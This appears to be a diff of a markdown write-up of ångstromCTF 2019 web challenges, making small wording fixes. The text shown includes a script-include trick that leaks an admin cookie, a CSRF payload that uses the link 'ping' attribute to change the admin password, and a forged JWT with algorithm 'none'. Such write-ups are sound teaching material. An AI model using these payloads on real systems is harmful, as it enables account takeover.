@@ -32,7 +32,7 @@ Solving script: [./NoSequels2/solve.py](./NoSequels2/solve.py)
 
 We had a simple upload page that allowed you to upload a custom HTML page. You could report suspicious URLs to admin.
 After uploading the page we get:
-```htmlmixed
+```html
 
 <!DOCTYPE html SYSTEM "3b16c602b53a3e4fc22f0d25cddb0fc4d1478e0233c83172c36d0a6cf46c171ed5811fbffc3cb9c3705b7258179ef11362760d105fb483937607dd46a6abcffc">
 <html>
@@ -86,14 +86,14 @@ Once again, we've got a simple webpage with URL reporting functionality. After a
 ```
 <script src='https://cookiemonster.2019.chall.actf.co/cookies'></script>
 ```
-and then read the window variable
+and then reading the window variable
 ```javascript
 var name = Object.getOwnPropertyNames(window).filter(x=>x.indexOf('admin')!=-1)[0];
 ```
 we get the admin's cookie `admin_GgxUa7MQ7UVo5JHFGLbqzuQfFFy4EDQNwZWAWJXS5_o=` and then the flag: **actf{defund_is_the_real_cookie_monster}**
 
 # GiantURL
-We have a domain where we can:
+We have a website where we can:
 - create `redirect` URL `GET /redirect`
 - change admin's password `POST /admin/changepass`
 - report URL `POST /report`
@@ -124,12 +124,13 @@ Click on <a href=<?php echo htmlspecialchars($_REQUEST['url']); ?>>this link</a>
 In theory we could insert the xss there, like for example: `<a href=aa onclick=alert()>this link</a>` but CSP will block such attempts because of the
 `Content-Security-Policy: default-src 'self'; style-src 'unsafe-inline';` header.
 
-However, there is a `ping` feature in `<a>` elements that sends a `POST` request when the link was clicked. So we can insert `<a href=aa ping="/admin/changepass?password=LONG_PASSWORD">this link</a>` in the `/redirect` so when an admin clicks on that URL their password will change. The full payload:
+However, there is a `ping` feature in `<a>` elements that sends a `POST` request when the link was clicked. So we can insert `<a href=aa ping="/admin/changepass?password=LONG_PASSWORD">this link</a>` in the `/redirect` and then when the admin clicks on that URL their password will change. The full payload:
 `
 https://giant_url.2019.chall.actf.co/redirect?url=aa%20ping=/admin/changepass?password=0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a
 `
 
-When admin visits our website we can log in using the new credentials. By doing that we get the flag: **actf{p1ng_p0ng_9b05891fa9c3bed74d02a349877b1c60}**
+After that we can log in using the new credentials and we get the flag: 
+**actf{p1ng_p0ng_9b05891fa9c3bed74d02a349877b1c60}**
 
 # Cookie Cutter
 The chalange is about hacking the JWT cookie. 
@@ -164,7 +165,7 @@ The cookie looks like:
 }
 ```
 
-By providing the cookie: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJyYW5kb21zdHIiLCJyb2xsZWQiOiJubyJ9.` which after decode looks like
+By providing the cookie: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJyYW5kb21zdHIiLCJyb2xsZWQiOiJubyJ9.` which after decoding looks like
 
 ```json
 {
@@ -177,7 +178,8 @@ By providing the cookie: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJwZXJtcyI6ImFkbW
   "rolled": "no"
 }
 ```
-We will get the flag, becasue `secrets["randomstr"]` will return `undefined` and we set the `algorithm` to `none`.
+
+we will get the flag, becasue `secrets["randomstr"]` will return `undefined` and we set the `algorithm` to `none`.
 
 The flag is: **actf{defund_ate_the_cookies_and_left_no_sign}**
 
